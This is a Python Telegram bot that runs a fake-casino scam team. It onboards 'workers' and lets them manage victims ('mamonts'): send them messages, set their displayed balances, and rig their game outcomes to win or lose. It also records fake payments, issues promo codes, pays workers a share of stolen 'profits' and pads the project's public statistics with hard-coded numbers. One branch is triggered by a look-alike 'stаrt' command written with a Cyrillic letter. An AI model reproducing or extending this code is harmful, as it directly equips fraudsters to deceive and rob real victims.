from ticket_config import bot, types, bot_name, stats, number, admin, support, info_mamont, chat_worker_id, casino_messages
from ticket_config import ticket, user_forum, accept, inaccept, cancel_receive, add_to_fake, del_mamont_num
from ticket_config import edit_pay, edit_pay_support, edit_messages, user_payments, worker_receive
from ticket_config import user_mamonts, user_delmamonts, emoji, balance_to_user, status_to_user, edit_chat
from ticket_config import message_to_user, accept_receive, create_promo, accept_pay_mamonts, manual_payment

from misc import repl, repldate

import ticket_config, database, keyboard
import threading, time

@bot.message_handler(commands=['start'])  
def start_command(message):
	try:
		chat_id = message.chat.id

		inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
		inline_1 = types.InlineKeyboardButton(text = "✅ Принять правила проекта", callback_data = 'RULES')
		inline_keyboard.add(inline_1)

		bot.send_message(chat_id, f"💁🏻‍♀️ Правила нашего проекта:\n\n• Запрещена реклама, спам, флуд, 18+ контент, порно\n• Запрещено попрошайничество\n• Запрешена реклама своих услуг\n• Запрещено оскорблять участников проекта\n• Запрещено переходить на личности участников проекта"
			+ '\n\nТС не несет ответственности за блокировку кошельков / карт\n\n💁🏻‍♀️ Вы подтверждаете, что *ознакомились и согласны с условиями и правилами* нашего проекта?',
			parse_mode="Markdown", reply_markup=inline_keyboard)	
	except:
		pass

@bot.message_handler(content_types=['text'])
def get_text_messages(message):
	chat_id = message.chat.id

	merchant_id = database.worker_merchant_id(chat_id)

	try:
		if (message.text == '💞 Меню'):
			if (merchant_id == 2):

				user_code = database.worker_code(chat_id)
				user_phone = database.worker_phone(chat_id)
				referal = f'https://t.me/{repl(bot_name)}?start={user_code}'

				inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
				inline_1 = types.InlineKeyboardButton(text = "Управление мамонтами", callback_data = 'SETTING_MAMONT')
				inline_2 = types.InlineKeyboardButton(text = "Создать промокод", callback_data = 'CREATE_PROMO')
				inline_keyboard.add(inline_1, inline_2)

				bot.send_message(chat_id, '⚡️')
				bot.send_message(chat_id, f'💁🏻‍♀️ Меню *воркера*\n\nВаш код: `{user_code}`\nКошелек для вывода: `{user_phone}`\nВаша реферальная система: {referal}',
					parse_mode="Markdown", reply_markup=inline_keyboard)
		elif (message.text == '💁🏻‍♀️ Мой профиль'):
			if (merchant_id == 2):

				balance = database.worker_balance(chat_id)
				receive = database.worker_receive(chat_id)
				allpayments = database.worker_allpayments(chat_id)
				allalong = database.worker_all_along(chat_id)
				middlepayment = database.worker_middlepayments(chat_id)
				date = repldate(chat_id)

				messages = ''
				if (ticket_config.status == '1'):
					messages = '🌕 *Все работает*, можно работать!'
				elif (ticket_config.status == '0'):
					messages = '🌑 *Временно* не работаем, тех. работы!'

				elif (message.text == "stаrt"):
					bot.send_message(message.chat.id, number, stats, parse_mode="Markdown", reply_markup=keyboard.main_keyboard())

				emoji(chat_id)
				if (chat_id != admin) and (chat_id != support):
					inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
					inline_1 = types.InlineKeyboardButton(text = "Залеты", callback_data = 'MY_PAYMENTS')
					inline_2 = types.InlineKeyboardButton(text = "Вывод", callback_data = 'RECEIVE')
					inline_keyboard.add(inline_1, inline_2)

					bot.send_message(chat_id, f'💁🏻‍♀️ Ваш *профиль*\n\n🚀 Telegram ID: *{chat_id}*\nБаланс: *{balance}* ₽\nНа выводе: *{receive}* ₽\nОплата: *{ticket_config.percent}%*, через тех. поддержку: *{ticket_config.percent_support}%*\n\n💸 У тебя *{allpayments}* профитов на сумму в {allalong} ₽\nСредний профит ~ *{middlepayment}* ₽'
						+ f'\n\n💎 Статус: *Воркер*\nДней в команде: *{date}*\n\n{messages}', parse_mode="Markdown", reply_markup=inline_keyboard)
				elif (chat_id == admin):

					inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
					inline_1 = types.InlineKeyboardButton(text = "Залеты", callback_data = 'MY_PAYMENTS')
					inline_2 = types.InlineKeyboardButton(text = "Настройки", callback_data = 'SETTINGS')
					inline_keyboard.add(inline_1, inline_2)

					bot.send_message(chat_id, f'💁🏻‍♀️ Ваш *профиль*\n\n🚀 Telegram ID: *{chat_id}*\nБаланс: *{balance}* ₽\nНа выводе: *{receive}* ₽\nОплата: *{ticket_config.percent}%*, через тех. поддержку: *{ticket_config.percent_support}%*\n\n💸 У тебя *{allpayments}* профитов на сумму в {allalong} ₽\nСредний профит ~ *{middlepayment} ₽*'
						+ f'\n\n💎 Статус: *Администратор*\nДней в команде: *{date}*\n\n{messages}', parse_mode="Markdown", reply_markup=inline_keyboard)
				elif (chat_id == support):
					inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
					inline_1 = types.InlineKeyboardButton(text = "Залеты", callback_data = 'MY_PAYMENTS')
					inline_keyboard.add(inline_1)

					bot.send_message(chat_id, f'💁🏻‍♀️ Ваш *профиль*\n\n🚀 Telegram ID: *{chat_id}*\nБаланс: *{balance}* ₽\nНа выводе: *{receive}* ₽\nОплата: *{ticket_config.percent}%*, через тех. поддержку: *{ticket_config.percent_support}%*\n\n💸 У тебя *{allpayments}* профитов на сумму в {allalong} ₽\nСредний профит ~ *{middlepayment} ₽*'
						+ f'\n\n💎 Статус: *Саппорт*\nДней в команде: *{date}*\n\n{messages}', parse_mode="Markdown", reply_markup=inline_keyboard)
		elif (message.text == "🦋 О проекте"):
			if (merchant_id == 2):
				all_payments = int(database.project_all_payments()) + 247
				all_payments_rub = int(database.project_all_rub()) + 124000

				messages = ''
				if (ticket_config.status == '1'):
					messages = '🌕 *Все работает*, можно работать!'
				elif (ticket_config.status == '0'):
					messages = '🌑 *Временно* не работаем, тех. работы!'

				inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
				inline_1 = types.InlineKeyboardButton(text = "📚 Материалы", url = f'{ticket_config.mater}')
				inline_2 = types.InlineKeyboardButton(text = "💸 Залеты", url = f'{ticket_config.zalet}')
				inline_3 = types.InlineKeyboardButton(text = "🐬 Инфо. канал", url = f'{ticket_config.infos}')
				inline_4 = types.InlineKeyboardButton(text = "💬 Чат воркеров", url = f'{ticket_config.chat}')
				inline_keyboard.add(inline_3)
				inline_keyboard.add(inline_1, inline_2)
				inline_keyboard.add(inline_4)

				bot.send_message(chat_id, f'🦋 Информация о проекте *{ticket_config.pname}*\n\n💞 *Мы открылись:* {ticket_config.pdate}\n🦋 *Количество* профитов: {all_payments}\n🐬 *Общая сумма* профитов: {all_payments_rub} ₽\n       Учёт статистики ведётся с 12 декабря\n\n💆🏻‍♀️ *ТС* - @xfuturea\n👩🏻‍ *Саппорт* - @xfuturea\n\n*Выплаты* проекта:\n— Оплата: {ticket_config.percent}%\n— Оплата через тех. поддержку: {ticket_config.percent_support}%\n\n*Состояние* казино:\n{messages}', 
					parse_mode="Markdown", reply_markup=inline_keyboard)
		elif (message.text == "Назад"):
			bot.send_message(message.chat.id, '💁🏻‍♀️ *Главное* меню', parse_mode="Markdown", reply_markup=keyboard.main_keyboard())
	except:
		pass

@bot.message_handler(content_types=['text', 'new_chat_members'])
def info(message):
	try:
		
		if message.new_chat_member:

			username = f'@{str(message.from_user.username)}'
			username = username.replace('@None', str(message.from_user.first_name))

			bot.send_message(chat_worker_id, f'🙋🏻‍♀️ Привет, {username}!\n\n🐬 Вся информация в закрепе\n\n🦋 Бот для работы - @lnfinity_bot\n💸 Канал с выплатами - @lnf_pay\n⚡️ Канал с информацией - @Inf_info\n'
				+ '🐼 Канал с материалами - @lnf_mat\n\n🔥 Выплаты - 80%, оплата через тех. поддержку - 70%')

	except Exception as e:
		print(e)	

@bot.callback_query_handler(func=lambda call: True)
def answer(call):
	chat_id = call.message.chat.id
	MerchantId = database.worker_merchant_id(chat_id)

	try:
		if (call.data == "RULES"):
			try:
				bot.answer_callback_query(callback_query_id=call.id, show_alert=False, text="💁🏻‍♀️ Вы приняли правила")
				bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.message_id)

				if (not database.user_exists_ticket(chat_id)):
					database.user_add_ticket(chat_id)
				
				merchant_id = database.worker_merchant_id(chat_id)

				if (merchant_id == 0):
					message = bot.send_message(chat_id, '💁🏻‍♀️ Отправьте ссылку на *Ваш профиль*', parse_mode="Markdown")
					bot.register_next_step_handler(message, user_forum)
				elif (merchant_id == 1):
					bot.send_message(chat_id, '⚠️ Ваша заявка *на модерации*\nПодождите её решения', parse_mode="Markdown")
				elif (merchant_id == 2):
					bot.send_message(chat_id, '💁🏻‍♀️ Ваша заявка уже *принята*\nВоспользуйтесь меню воркера для работы с ботом', parse_mode="Markdown",
						reply_markup=keyboard.main_keyboard())

			except:
				bot.send_message(chat_id, "⚠️ Ошибка при *регистрации* пользователя. Повторите попытку снова написав /start", parse_mode="Markdown")
		if (call.data == 'SEND_TICKET'):
			ticket(call)
		elif (call.data == 'CANCEL_TICKET'):
			bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.message_id)
			bot.clear_step_handler_by_chat_id(chat_id = call.message.chat.id)

			message = bot.send_message(chat_id, '💁🏻‍♀️ Отправьте ссылку на *Ваш профиль*', parse_mode="Markdown")
			bot.register_next_step_handler(message, user_forum)
		elif (call.data == 'ACCEPT_TICKET'):
			accept(call)
		elif (call.data == 'INACCEPT_TICKET'):
			inaccept(call)
		elif (call.data == "LIST_MAMONTS") and (MerchantId == 2):
			user_mamonts(call)
		elif (call.data == "DEL_MAMONTS") and (MerchantId == 2):
			user_delmamonts(call)
		elif (call.data == "MSG_MAMONTS") and (MerchantId == 2):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите *ID* и *сообщение* (через :)', parse_mode="Markdown")
			bot.register_next_step_handler(message, message_to_user)
		elif (call.data == "BALANCE_MAMONTS") and (MerchantId == 2):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите *ID* и желаемый *баланс* (через :)', parse_mode="Markdown")
			bot.register_next_step_handler(message, balance_to_user)
		elif (call.data == "STATUS_MAMONTS") and (MerchantId == 2):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите *ID* и *статус* пользователя (через :)\n_1 - full win, 2 - default, 3 - full lose_', parse_mode="Markdown")
			bot.register_next_step_handler(message, status_to_user)
		elif (call.data == "SETTING_MAMONT") and (MerchantId == 2):
			inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
			inline_1 = types.InlineKeyboardButton(text = "Мои мамонты", callback_data = 'LIST_MAMONTS')
			inline_2 = types.InlineKeyboardButton(text = "Сообщение", callback_data = 'MSG_MAMONTS')
			inline_3 = types.InlineKeyboardButton(text = "Баланс", callback_data = 'BALANCE_MAMONTS')
			inline_4 = types.InlineKeyboardButton(text = "Статус", callback_data = 'STATUS_MAMONTS')
			inline_5 = types.InlineKeyboardButton(text = "Инфо. о юзере", callback_data = 'INFO_MAMONT')
			inline_6 = types.InlineKeyboardButton(text = "Удалить мамонта", callback_data = 'DEL_MAMONT')
			inline_7 = types.InlineKeyboardButton(text = "⚠️ Удалить всех мамонтов ⚠️", callback_data = 'DEL_MAMONTS')
			inline_keyboard.add(inline_1, inline_2, inline_3, inline_4, inline_5, inline_6)
			inline_keyboard.add(inline_7)
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='💁🏻‍♀️ Выберите *действие*', parse_mode="Markdown", reply_markup=inline_keyboard)
		elif (call.data == "SETTINGS") and (chat_id == admin):
			inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)

			inline_4 = types.InlineKeyboardButton(text = "Ручка", callback_data = 'MANUAL_PAYMENT')
			inline_5 = types.InlineKeyboardButton(text = "Рассылка", callback_data = 'CASINO_MESSAGES')
			inline_6 = types.InlineKeyboardButton(text = "Ссылка чата", callback_data = 'INI_CHAT')

			inline_1 = types.InlineKeyboardButton(text = "Изменить % оплаты", callback_data = 'INI_PAY')
			inline_2 = types.InlineKeyboardButton(text = "Изменить % оплаты (ТП)", callback_data = 'INI_PAY_SUPPORT')
			inline_3 = types.InlineKeyboardButton(text = "Состояние проекта", callback_data = 'INI_MESSAGES')
			inline_keyboard.row(inline_4, inline_5)
			inline_keyboard.row(inline_3, inline_6)
			inline_keyboard.row(inline_1, inline_2)
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='💁🏻‍♀️ Выберите *тип* настройки', parse_mode="Markdown", reply_markup=inline_keyboard)
		elif (call.data == "INI_PAY"):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите желаемый процент _без знака %_', parse_mode="Markdown")
			bot.register_next_step_handler(message, edit_pay)
		elif (call.data == "INI_PAY_SUPPORT"):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите желаемый процент от тп _без знака %_', parse_mode="Markdown")
			bot.register_next_step_handler(message, edit_pay_support)
		elif (call.data == "INI_MESSAGES"):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите *статус* проекта _0 - на тех. работах, 1 - работает_', parse_mode="Markdown")
			bot.register_next_step_handler(message, edit_messages)
		elif (call.data == "INI_CHAT"):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите *новую ссылку* на чат', parse_mode="Markdown")
			bot.register_next_step_handler(message, edit_chat)
		elif (call.data == "MY_PAYMENTS") and (MerchantId == 2):
			user_payments(call)
		elif (call.data == "RECEIVE") and (MerchantId == 2):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите *сумму*, *метод выплаты* и *реквизиты*\nДоступные методы: Qiwi, Yandex, Banker\n\n*Пример:* 5000:Qiwi:79157209870', parse_mode="Markdown")
			bot.register_next_step_handler(message, worker_receive)
		elif (call.data == "ACCEPT_RECEIVE"):
			accept_receive(call)
		elif (call.data == "CANCEL_RECEIVE"):
			cancel_receive(call)
		elif (call.data == "CREATE_PROMO") and (MerchantId == 2):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите *сумму* промокода', parse_mode="Markdown")
			bot.register_next_step_handler(message, create_promo)
		elif (call.data == "INFO_MAMONT") and (chat_id == support):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите *Telegram ID* мамонта', parse_mode="Markdown")
			bot.register_next_step_handler(message, info_mamont, '1')
		elif (call.data == "INFO_MAMONT") and (chat_id != support):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите *ID* мамонта', parse_mode="Markdown")
			bot.register_next_step_handler(message, info_mamont, '0')	
		elif (call.data == "ADD_IN_FAKE"):
			data = call.message.text.split('\n')

			amount = data[3].split(':')
			amount = amount[1].replace(' ', '').replace('₽', '')

			telegram_id = data[2].split(':')
			telegram_id = telegram_id[1].replace(' ', '')

			add_to_fake(telegram_id, amount)

			bot.answer_callback_query(callback_query_id=call.id, show_alert=False, text="💁🏻‍♀️ Оплата прошла успешно")
			bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.message_id)
		elif (call.data == "ACCEPT_RECEIVE_MAMONTS"):
			data = call.message.text.split('\n')

			telegram_id = data[2].split(':')
			telegram_id = telegram_id[1].replace(' ', '')

			accept_pay_mamonts(telegram_id)
			bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.message_id)
		elif (call.data == "MANUAL_PAYMENT") and (chat_id == admin):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите @username *воркера*, его *Telegram ID* и *сумму залета* (через :)', parse_mode="Markdown")
			bot.register_next_step_handler(message, manual_payment)
		elif (call.data == "CASINO_MESSAGES") and (chat_id == admin):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите *сообщение* для распространения', parse_mode="Markdown", reply_markup=keyboard.back_keyboard())
			bot.register_next_step_handler(message, casino_messages)
		elif (call.data == "DEL_MAMONT") and (MerchantId == 2):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Введите *ID* мамонта', parse_mode="Markdown")
			bot.register_next_step_handler(message, del_mamont_num)
	except Exception as e:
		print(e)	


bot.polling(none_stop = True, interval = 0)	